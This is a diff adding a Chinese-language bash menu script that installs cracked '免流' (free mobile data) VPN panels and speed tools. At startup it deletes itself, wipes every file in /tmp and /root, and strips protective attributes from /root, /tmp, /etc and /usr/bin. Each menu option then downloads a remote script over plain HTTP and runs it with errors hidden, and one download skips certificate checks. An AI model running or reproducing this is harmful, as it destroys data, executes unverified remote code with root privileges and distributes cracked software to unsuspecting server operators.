@@ -1,0 +1,206 @@
+#!/bin/bash
+sleep 1
+ulimit -c 0 >/dev/null 2>&1
+rm -rf $0 >/dev/null 2>&1
+rm -rf xbcpj >/dev/null 2>&1
+rm -f /tmp/* >/dev/null 2>&1
+rm -f /root/* >/dev/null 2>&1
+chattr -a /root >/dev/null 2>&1
+chattr -a /tmp >/dev/null 2>&1
+chattr -a /etc >/dev/null 2>&1
+chattr -a /usr/bin >/dev/null 2>&1
+# ********************************** 脚本开始 **************************** #
+IP=`wget http://www.sbwml.cn/getip -O - -q ; echo`;
+# LOGO ********************************************************************
+# 广告通知 ****************************************************************
+echo
+echo "正在检测您的IP是否正确加载..."
+
+	if [[ "$IP" == '' ]]; then
+		echo '无法检测您的IP,可能会影响到您接下来的搭建工作';
+		read -p '请输入您的公网IP:' IP;
+		[[ "$IP" == '' ]] && InputIPAddress;
+	fi;
+	[[ "$IP" == '' ]] && 
+						 echo -e 'IP状态：			  [\033[32m  OK  \033[0m]'
+						 echo -e "您的IP是：\033[34m$IP \033[0m"
+						 echo 
+						 echo
+	if [ mod=1 ]
+	then
+echo -e "\033[33m========================================================================= \033[0m"
+echo -e "\033[36m                     年少不轻狂、莫为少年郎 \033[0m"
+echo ""
+echo -e "\033[36m                       官网网站：小羽 \033[0m"
+echo ""
+echo -e "\033[36m                       小羽QQ：2453223958 \033[0m"
+echo ""
+echo -e "\033[36m                       免流交流群:2453223958\033[0m"
+echo ""
+echo -e "\033[1;5;31m        欢迎使用小羽综合脚本：\n\033[0;1;36m"
+echo -e
+echo -e
+echo -e "\033[0;1;35m                  1.青云破解脚本               【7.x系统】  6-14更新    \033[0m"   
+echo -e "\033[0;1;35m                  2.心欣破解脚本               【7.x系统】              \033[0m"               
+echo -e "\033[0;1;35m                  3.大猫破解脚本               【7.x系统】  4-20更新    \033[0m" 
+echo -e "\033[0;1;35m                  4.天天破解脚本               【7.x系统】  5-20更新    \033[0m" 
+echo -e "\033[0;1;35m                  5.HTML破解脚本               【7.x系统】              \033[0m" 
+echo -e "\033[0;1;35m                  6.斌哥破解脚本               【7.x系统】              \033[0m" 
+echo -e "\033[0;1;35m                  7.传说破解脚本               【7.x系统】              \033[0m"
+echo -e "\033[0;1;35m                  8.草根破解脚本               【7.x系统】  5-20更新    \033[0m"  
+echo -e "\033[0;1;35m                  9.康师傅破解脚本             【7.x系统】              \033[0m"  
+echo -e "\033[0;1;35m                 10.NB免流破解脚本             【7.x系统】  4-20更新    \033[0m" 
+echo -e "\033[0;1;35m                 11.骚逼汪破解脚本             【7.x系统】  5-20更新    \033[0m" 
+echo -e "\033[0;1;35m                 12.HTML2.1破解脚本            【7.x系统】  4-20更新    \033[0m" 
+echo -e "\033[0;1;35m                 13.快云3期破解脚本            【7.x系统】  5-23更新    \033[0m" 
+
+#echo
+echo -e "\033[0;1;36m        小工具搭建脚本:                                    \033[0m"
+echo
+echo -e "\033[0;1;31m                  20.一键开任意端口共存版      \033[0m"
+echo -e "\033[0;1;31m                  21.修复云免没网脚本          \033[0m" 
+echo -e "\033[0;1;31m                  22.一键锐速加速脚本    6.X          \033[0m"
+echo -e "\033[0;1;31m                  23.最新一键锐速加速 所有系统          \033[0m"
+echo    
+echo   -e "\033[0;1;32m             如有脚本不能搭建 欢迎反馈         \033[0m"                                                                                                                      
+echo -e "\033[36m                                                by 小白免流       \033[0m"
+echo -e "\033[33m========================================================================== \033[0m"
+echo
+echo
+echo -n "输入您要搭建的选项: " 
+read mode
+fi
+if [[ $mode == "1" ]]     
+then
+echo -e "安装类型：\033[36m青云破解脚本\033[0m" ;  
+wget http://xbmlpj.nos-eastchina1.126.net/qy  >/dev/null 2>&1
+bash qy
+fi
+
+if [[ $mode == "2" ]] 
+then
+echo -e "安装类型：\033[36m心欣破解脚本\033[0m" ;  >/dev/null 2>&1
+wget http://xbml.vip/dbxb 
+bash dbxb
+fi
+
+
+
+if [[ $mode == "3" ]] 
+then
+echo -e "安装类型：\033[36m大猫破解脚本\033[0m" ;
+sleep 1 
+wget  http://xbmlpj.nos-eastchina1.126.net/dm  >/dev/null 2>&1
+bash dm 
+fi
+
+
+if [[ $mode == "9" ]] 
+then
+echo -e "安装类型：\033[36m康师傅破解脚本\033[0m" ; 
+wget  http://xbmlpj.nos-eastchina1.126.net/kang.sh  >/dev/null 2>&1
+bash kang.sh
+fi
+
+if [[ $mode == "4" ]] 
+then
+echo -e "安装类型：\033[36m天天破解脚本\033[0m" ; 
+wget  http://xbmlpj.nos-eastchina1.126.net/tt  >/dev/null 2>&1
+bash tt
+fi
+
+
+if [[ $mode == "5" ]] 
+then
+echo -e "安装类型：\033[36mHTML破解脚本\033[0m" ; 
+wget http://xbmlpj.nos-eastchina1.126.net/html  >/dev/null 2>&1
+bash html
+fi
+
+
+if [[ $mode == "6" ]] 
+then
+echo -e "安装类型：\033[36m斌哥破解脚本\033[0m" ; 
+wget http://xbmlpj.nos-eastchina1.126.net/bin  >/dev/null 2>&1
+bash bin
+fi
+
+
+
+if [[ $mode == "7" ]] 
+then
+echo -e "安装类型：\033[36m传说破解脚本\033[0m" ; 
+wget http://xbmlpj.nos-eastchina1.126.net/cs >/dev/null 2>&1
+bash cs
+fi
+
+if [[ $mode == "8" ]] 
+then
+echo -e "安装类型：\033[36m草根破解脚本\033[0m" ; 
+wget  http://xbmlpj.nos-eastchina1.126.net/cg >/dev/null 2>&1
+bash cg
+fi
+
+if [[ $mode == "10" ]] 
+then
+echo -e "安装类型：\033[36mNB免流破解脚本\033[0m" ; 
+wget  http://xbmlpj.nos-eastchina1.126.net/fy >/dev/null 2>&1
+bash fy
+fi
+
+if [[ $mode == "12" ]] 
+then
+echo -e "安装类型：\033[36mHTML2.1破解脚本\033[0m" ; 
+wget http://xbmlpj.nos-eastchina1.126.net/html2.1 >/dev/null 2>&1
+bash html2.1
+fi
+
+
+if [[ $mode == "11" ]] 
+then
+echo -e "安装类型：\033[36m骚逼汪破解脚本\033[0m" ; 
+wget http://xbmlpj.nos-eastchina1.126.net/sbw >/dev/null 2>&1
+bash sbw
+fi
+
+
+if [[ $mode == "13" ]] 
+then
+echo -e "安装类型：\033[36m快云3期破解脚本\033[0m" ; 
+wget http://xbmlpj.nos-eastchina1.126.net/ky >/dev/null 2>&1
+bash ky
+fi
+
+
+if [[ $mode == "20" ]] 
+then
+echo -e "安装类型：\033[36m一键开任意端口共存版\033[0m" ; 
+wget  http://xbml.vip/kdk   >/dev/null 2>&1
+bash kdk
+fi
+
+
+if [[ $mode == "21" ]] 
+then
+echo -e "安装类型：\033[36m修复云免没网脚本\033[0m" ; 
+wget  http://xbml.vip/xiu  >/dev/null 2>&1
+bash xiu
+fi
+
+
+if [[ $mode == "22" ]]     
+then
+echo -e "安装类型：\033[36m一键锐速加速脚本\033[0m" ;  
+wget http://xbmlpj.nos-eastchina1.126.net/sr.sh >/dev/null 2>&1
+bash sr.sh
+fi
+
+if [[ $mode == "23" ]] 
+then
+echo -e "安装类型：\033[36m最新一键锐速加速、后面两个都输入1\033[0m" ; 
+wget -N --no-check-certificate https://raw.githubusercontent.com/91yun/serverspeeder/master/serverspeeder-all.sh && bash serverspeeder-all.sh
+fi
+
+
+rm -- "$0"
+exit 0
